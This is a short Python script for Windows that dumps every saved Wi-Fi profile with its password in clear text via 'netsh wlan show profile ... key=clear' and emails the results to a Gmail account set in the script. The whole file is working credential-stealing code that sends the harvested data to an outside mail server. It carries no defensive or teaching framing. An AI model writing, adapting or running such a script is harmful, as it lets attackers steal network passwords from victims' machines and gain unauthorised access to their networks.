#!/usr/bin/env python3
mymail = ""
mypass = ""
#Imports
import subprocess
import smtplib
import re

#Functions
def sendmail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

#main
command = "netsh wlan show profile"

networks = subprocess.check_output(command, shell=True)
network_names_list = re.findall("(?:Profile\s*:\s)(.*)", networks.decode())
result = ""

for network in network_names_list:
    command = "netsh wlan show profile " + network + " key=clear"
    current_result = subprocess.check_output(command, shell=True, encoding="UTF-8")
    result = result + str(current_result)

sendmail(mymail, mypass, "\n" + result)